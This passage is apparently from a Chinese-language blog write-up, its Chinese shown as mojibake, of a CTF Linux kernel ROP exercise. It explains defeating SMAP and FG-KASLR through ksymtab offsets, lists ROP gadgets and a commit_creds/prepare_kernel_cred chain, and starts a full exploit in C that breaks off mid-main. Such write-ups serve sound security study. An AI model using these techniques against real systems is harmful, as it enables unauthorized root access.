</blockquote>
<p>å¦‚æœæ„é€ ROPé“¾, è¿”å›åˆ°<code>    0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</code>è¿™ä¸€è¡Œ</p>
<p>ä¸‹é¢è¿˜è¦å¡«å……ä¸¤ä¸ªdummyæ¥æ»¡è¶³è¿™ä¸¤ä¸ªpop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br></pre></td></tr></table></figure>



<h3 id="bypass-SMAP"><a href="#bypass-SMAP" class="headerlink" title="bypass SMAP"></a>bypass SMAP</h3><p>smapæ„å‘³ç€å†…æ ¸æ€æ— æ³•è®¿é—®ç”¨æˆ·æ€ä»»ä½•æ•°æ®</p>
<p>è±¡å†…æ ¸æ ˆè¿ç§»åˆ°ç”¨æˆ·æ€æ˜ å°„åŒºå°±ç™½æ­äº†</p>
<p>ä½†æ˜¯çº¯ç”¨ropé“¾è¿˜æ˜¯å¯ä»¥çš„</p>
<h3 id="bypass-KASLR"><a href="#bypass-KASLR" class="headerlink" title="bypass KASLR"></a>bypass KASLR</h3><p><code>FG-KASLR</code>,ä¸å…‰æ•´ä¸ªå†…æ ¸é•œåƒåŸºåœ°å€éšæœº, éƒ¨åˆ†å‡½æ•°ä¹‹é—´çš„ç›¸å¯¹åç§»é‡ä¹Ÿä¼šå˜, çœŸæ˜¯æ­»ğŸäº†</p>
<p>å¦‚æœä½¿ç”¨<code>readelf -S ./vmlinux | grep &quot;.text&quot;</code>æŸ¥çœ‹textèŠ‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">^C</span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># readelf -S ./vmlinux | grep <span class="string">&quot;.text&quot;</span> | head -n 15</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS         ffffffff81000000  <span class="number">00200000</span></span><br><span class="line">  [ <span class="number">2</span>] .rela.text        RELA             <span class="number">0000000000000000</span>  <span class="number">024</span>d3b10</span><br><span class="line">  [ <span class="number">3</span>] .text.unlike[...] PROGBITS         ffffffff81400dd7  <span class="number">00600</span>dd7</span><br><span class="line">  [ <span class="number">4</span>] .text.__star[...] PROGBITS         ffffffff81400e90  <span class="number">00600e90</span></span><br><span class="line">  [ <span class="number">5</span>] .text.__do_s[...] PROGBITS         ffffffff81400ea0  <span class="number">00600</span>ea0</span><br><span class="line">  [ <span class="number">6</span>] .text.__xen_[...] PROGBITS         ffffffff81400eb0  <span class="number">00600</span>eb0</span><br><span class="line">  [ <span class="number">7</span>] .text.vvar_mremap PROGBITS         ffffffff81400ed0  <span class="number">00600</span>ed0</span><br><span class="line">  [ <span class="number">8</span>] .text.vdso_fault  PROGBITS         ffffffff81400f00  <span class="number">00600f</span>00</span><br><span class="line">  [ <span class="number">9</span>] .text.map_vdso    PROGBITS         ffffffff81400f90  <span class="number">00600f</span>90</span><br><span class="line">  [<span class="number">10</span>] .text.map_vd[...] PROGBITS         ffffffff814010c0  <span class="number">006010</span>c0</span><br><span class="line">  [<span class="number">11</span>] .text.vdso_mremap PROGBITS         ffffffff81401170  <span class="number">00601170</span></span><br><span class="line">  [<span class="number">12</span>] .text.<span class="type">find_t</span>[...] PROGBITS         ffffffff81401210  <span class="number">00601210</span></span><br><span class="line">  [<span class="number">13</span>] .text.vvar_fault  PROGBITS         ffffffff81401230  <span class="number">00601230</span></span><br><span class="line">  [<span class="number">14</span>] .text.arch_g[...] PROGBITS         ffffffff81401450  <span class="number">00601450</span></span><br><span class="line">  [<span class="number">15</span>] .text.vdso_j[...] PROGBITS         ffffffff81401470  <span class="number">00601470</span></span><br></pre></td></tr></table></figure>

<p>é™¤å»çº¯æ­£çš„<code>.text</code>èŠ‚ä¹‹å¤–, è¿˜æœ‰å¾ˆå¤š<code>.text.*</code>çš„èŠ‚, è¿™äº›èŠ‚éƒ½å¾ˆå°,ç”šè‡³äºŒä¸‰åå­—èŠ‚ä¸€ä¸ª, èŠ‚é‡Œé¢ä¹Ÿå°±ä¸€ä¸¤ä¸ªå‡½æ•°</p>
<p>å…¶ä½œç”¨å°±æ˜¯æ¯ä¸ªèŠ‚éƒ½å¯ä»¥éšæœºæ’åˆ—, å®ç°<code>FG-KASLR</code></p>
<p>ä½†æ˜¯ğŸè¿˜æ²¡æœ‰æ­»å®Œ</p>
<p><code>.text</code>èŠ‚æ˜¯ä¸€æ•´ä¸ªå„¿,åªä¼šæ•´ä½“å‚ä¸ASLR,ä½†æ˜¯èŠ‚å†…çš„å‡½æ•°ä¸ä¼šå‚ä¸<code>FG-KASLR</code>,è€ŒèŠ‚å†…å‡½æ•°å°±æœ‰<code>swapgs_restore_regs_and_return_to_usermode</code>,</p>
<p><code>.text</code>èŠ‚åœ¨æœªå¼€å¯<code>KASLR</code>æ—¶çš„èŒƒå›´: <code>0xffffffff81000000 ~ 0xffffffff81400dd7</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text @ 0xffffffff81000000 </span><br><span class="line">swapgs_restore_regs_and_return_to_usermode @ 0xffffffff81200f10		offset_to_text = 0x200f10</span><br><span class="line">kpti_trampoline @ 0xffffffff81200f26								offset_to_text = 0x200f26</span><br></pre></td></tr></table></figure>

<p><code>ksymtab</code>ä¸å±äºä»»ä½•<code>text</code>èŠ‚,åªå‚ä¸<code>KASLR</code>,å› æ­¤<code>ksymtab</code>åˆ°<code>.text</code> çš„åç§»é‡ä¹Ÿæ˜¯å›ºå®šçš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab @ <span class="number">0xffffffff81f85198</span>		offset_to_text = <span class="number">0xf85198</span></span><br></pre></td></tr></table></figure>

<p><code>ksymtab</code>æ˜¯ä¸€ä¸ªæ˜ å°„è¡¨è¡¨ä¸­çš„æ¯ä¸€é¡¹éƒ½é•¿è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	  <span class="type">int</span> value_offset;				<span class="comment">//ç¬¦å·åœ°å€ ç›¸å¯¹äº æœ¬å­—æ®µ çš„åç§»é‡</span></span><br><span class="line">	  <span class="type">int</span> name_offset;				<span class="comment">//ç¬¦å·ååœ°å€ ç›¸å¯¹äº æœ¬å­—æ®µ çš„åç§»é‡</span></span><br><span class="line">	  <span class="type">int</span> namespace_offset;			<span class="comment">//ç¬¦å·å‘½åç©ºé—´åœ°å€, ç›¸å¯¹äº æœ¬å­—æ®µ çš„åç§»é‡</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™ä¸‰ä¸ªå­—æ®µçš„æ„ä¹‰æ˜¯ä»€ä¹ˆå‘¢? ä»¥commit_credså‡½æ•°ä¸ºä¾‹,</p>
<p>é¦–å…ˆåœ¨æœªå¼€å¯KASLRçš„å†…æ ¸ä¸Š,æ‰¾åˆ°å®ƒåœ¨ksymtabä¸­çš„åœ°å€,æ˜¯<code>0xffffffff81f87d90</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep <span class="string">&quot;commit_creds&quot;</span></span></span><br><span class="line">ffffffff814c6410 T commit_creds</span><br><span class="line">ffffffff81f87d90 r __ksymtab_commit_creds</span><br><span class="line">ffffffff81fa0972 r __kstrtab_commit_creds</span><br><span class="line">ffffffff81fa4d42 r __kstrtabns_commit_creds</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨gdbä¸­æ‰“å°<code>ffffffff81f87d90</code>å¤„ä¸‰ä¸ªåŒå­—</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3wx 0xffffffff81f87d90</span><br><span class="line">0xffffffff81f87d90:     0xff53e680      0x00018bde      0x0001cfaa</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value_offset = 0xff53e680</span><br><span class="line">name_offset = 0x00018bde</span><br><span class="line">name_space_offset = 0x0001cfaa</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>value_offset</code>æ˜¯ç¬¦å·å®é™…åœ°å€ä¸æœ¬å­—æ®µ<code>kernel_symbol.value_offset</code>çš„åç§»é‡</p>
<p>ç¬¦å·æè¿°ç¬¦__ksymtab_commit_credsçš„åœ°å€åœ¨<code>0xffffffff81f87d90</code></p>
<p>ç¬¦å·ä¸ç¬¦å·æè¿°ç¬¦çš„è·ç¦»æ˜¯<code>((1&lt;&lt;32) - 0xff53e680)</code>,ç”±æ­¤è®¡ç®—å¾—åˆ°ç¬¦å·åœ°å€åœ¨<code>0xffffffff814c6410</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffffff81f87d90</span> - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - <span class="number">0xff53e680</span>)</span><br><span class="line">$<span class="number">17</span> = <span class="number">0xffffffff814c6410</span></span><br></pre></td></tr></table></figure>

<p>åŒç†name_offsetä¹Ÿæ˜¯ç¬¦å·åå­—ç¬¦ä¸²æ‰€åœ¨åœ°å€ç›¸å¯¹äºæœ¬å­—æ®µ<code>kernel_symbol.name_offset</code>çš„åç§»é‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 0xffffffff81fa0972 - 0xffffffff81f87d94</span><br><span class="line">$22 = 0x18bde</span><br></pre></td></tr></table></figure>

<p>åŒç†name_space_offsetæ˜¯ç¬¦å·å‘½åç©ºé—´å­—ç¬¦ä¸²ä¸æœ¬å­—æ®µ<code>kernel_symbol.namespace_offset</code>çš„åç§»é‡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>s <span class="number">0xffffffff81fa4d42</span></span><br><span class="line"><span class="number">0xffffffff81fa4d42</span>:     <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d43</span>:     <span class="string">&quot;bpf_trace_run11&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d53</span>:     <span class="string">&quot;bpf_trace_run12&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d63</span>:     <span class="string">&quot;kprobe_event_cmd_init&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d79</span>:     <span class="string">&quot;__kprobe_event_gen_cmd_start&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d96</span>:     <span class="string">&quot;__kprobe_event_add_fields&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4db0</span>:     <span class="string">&quot;kprobe_event_delete&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4dc4</span>:     <span class="string">&quot;__tracepoint_suspend_resume&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4de0</span>:     <span class="string">&quot;__tracepoint_cpu_idle&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4df6</span>:     <span class="string">&quot;__tracepoint_cpu_frequency&quot;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°,è¿™ä¸ªç¬¦å·å±äºä¸€ä¸ªé€šç”¨çš„å‘½åç©ºé—´</p>
</blockquote>
<p>å›åˆ°æœ¬é¢˜ä¸­,æ€è·¯å¦‚ä¸‹:</p>
<p>1.<code>hackme_read</code>å‡½æ•°ä¸­æ³„éœ²<code>canary</code>, ä¸€ä¸ª<code>text</code>æ®µçš„åœ°å€, è®¡ç®—å¾—åˆ°<code>text</code>åŸºåœ°å€, ä»¥åŠ<code>ksymtab</code>åœ°å€ç­‰</p>
<p>2.<code>ksymtab </code>ä¸­æŸ¥åˆ°<code>commit_creds</code>å’Œ<code>prepare_kernel_cred</code>çš„åœ°å€</p>
<p>3.æ„é€ <code>rop</code>é“¾æ¡</p>
<h4 id="1-æ ˆä¸Šæ³„éœ²ä¸€ä¸ªtext-åœ°å€"><a href="#1-æ ˆä¸Šæ³„éœ²ä¸€ä¸ªtext-åœ°å€" class="headerlink" title="1.æ ˆä¸Šæ³„éœ²ä¸€ä¸ªtext åœ°å€"></a>1.æ ˆä¸Šæ³„éœ²ä¸€ä¸ª<code>text</code> åœ°å€</h4><p>åœ¨<code>read</code>å‡½æ•°ä¸­ä¹‹å‰æˆ‘ä»¬åªæ³„éœ²äº†<code>canary</code>å€¼, ç°åœ¨è¿˜è¦å†æ³„éœ²ä¸€ä¸ª<code>text</code>æ®µçš„åœ°å€,ä»¥æ­¤è®¡ç®—<code>text</code>æ®µåŸºåœ°å€</p>
<p>åœ¨æœªå¼€å¯<code>KASLR</code>çš„æƒ…å†µä¸‹è§‚å¯Ÿä»<code>kstack_buf</code>å¼€å§‹çš„å †æ ˆä¸Š,æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<code>text</code>æ®µçš„åœ°å€ ,ç»“æœå‘ç°è¿˜çœŸæœ‰</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241125151929536.png" alt="image-20241125151929536"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffc900001bff38</span> <span class="number">-0xffffc900001bfe08</span></span><br><span class="line">$<span class="number">4</span> = <span class="number">0x130</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">0x26</span></span><br><span class="line">pwndbg&gt; p <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">6</span> = <span class="number">38</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ ,<code>stack_buf + 0x130 </code>å­—èŠ‚å¼€å§‹å¤„çš„ä¸€ä¸ªå››å­—å°±æ˜¯è¿™ä¸ªæ³„éœ²</p>
<h4 id="2-ä»ksymtabä¸­æŸ¥å‡½æ•°åœ°å€"><a href="#2-ä»ksymtabä¸­æŸ¥å‡½æ•°åœ°å€" class="headerlink" title="2.ä»ksymtabä¸­æŸ¥å‡½æ•°åœ°å€"></a>2.ä»<code>ksymtab</code>ä¸­æŸ¥å‡½æ•°åœ°å€</h4><p>å†…å­˜ä»»æ„è¯»,è¿™ä¹Ÿå¯ä»¥é€šè¿‡<code>gadget</code>å®ç°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot; : mov rax.*qword ptr .* ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff81004aad</span> : mov rax, qword ptr [rax + <span class="number">0x10</span>] ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81015a7f</span> : mov rax, qword ptr [rax] ; pop rbp ; ret</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret</code>è¿™ä¸ª<code>gadget</code>,è¿˜éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿæ§åˆ¶<code>rax</code>å€¼çš„<code>gadget</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rax ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81004d11 : pop rax ; ret</span><br></pre></td></tr></table></figure>

<p>è¿˜éœ€è¦ä¸€ä¸ªæ§åˆ¶<code>rdi</code>å¯„å­˜å™¨ä½œä¸ºå‡½æ•°å‚æ•°çš„<code>gadget</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rdi ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81006370 : pop rdi ; ret</span><br></pre></td></tr></table></figure>



<h4 id="3-æ„é€ ROPé“¾æ¡"><a href="#3-æ„é€ ROPé“¾æ¡" class="headerlink" title="3.æ„é€ ROPé“¾æ¡"></a>3.æ„é€ ROPé“¾æ¡</h4><p>1.ä»»æ„å†…å­˜è¯»æ³„éœ²<code>prepare_kernel_creds</code>å‡½æ•°åç§»é‡</p>
<p>2.<code>kpti-trampoline</code>è¿”å›åˆ°ç”¨æˆ·æ€,è®¡ç®—<code>prepare_kernel_creds</code>å‡½æ•°åœ°å€</p>
<p>3.ä»»æ„å†…å­˜è¯»æ³„éœ²<code>commit_creds</code>å‡½æ•°åç§»é‡</p>
<p>4.<code>kpti-trampoline</code>è¿”å›åˆ°ç”¨æˆ·æ€,è®¡ç®—<code>commit_creds</code>å‡½æ•°åœ°å€</p>
<p>5.<code>ret2 prepare_kernel_creds</code></p>
<p>6.<code>kpti-trampoline</code>è¿”å›åˆ°ç”¨æˆ·æ€,ä¿å­˜<code>init_task @ rax </code></p>
<p>7.<code>init_task pop to rdi</code></p>
<p>8.<code>ret2 commit_creds</code></p>
<p>9.<code>kpti-trampoline</code>è¿”å›åˆ°ç”¨æˆ·æ€,èµ·<code>shell</code></p>
<h4 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> addr_leak;</span><br><span class="line"><span class="type">size_t</span> off_leak = <span class="number">0xa157</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_text_base;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab = <span class="number">0xf85198</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_commit_creds = <span class="number">0xf87d90</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_commit_creds;</span><br><span class="line"><span class="type">size_t</span> addr_commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_prepare_kernel_cred = <span class="number">0xf8d4fc</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_prepare_kernel_cred;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_kpti_trampoline = <span class="number">0x200f26</span>;</span><br><span class="line"><span class="type">size_t</span> addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_deref_rax_pop_rbp_ret = <span class="number">0x15a7f</span>;</span><br><span class="line"><span class="type">size_t</span> addr_deref_rax_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rax_ret = <span class="number">0x4d11</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rax_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rdi_ret = <span class="number">0x6370</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_init_task_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"><span class="type">int</span> value_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>;   </span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//ä¿å­˜è¿›å…¥å†…æ ¸ä¹‹å‰çš„ç”¨æˆ·æ€ä¸Šä¸‹æ–‡</span></span><br><span class="line">    open_dev();     <span class="comment">//æ‰“å¼€è®¾å¤‡</span></span><br><span class="line">    leak();  <span class="comment">//æ³„éœ²canary</span></span><br><span class="line">    leak_prepare_kernel_cred();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be 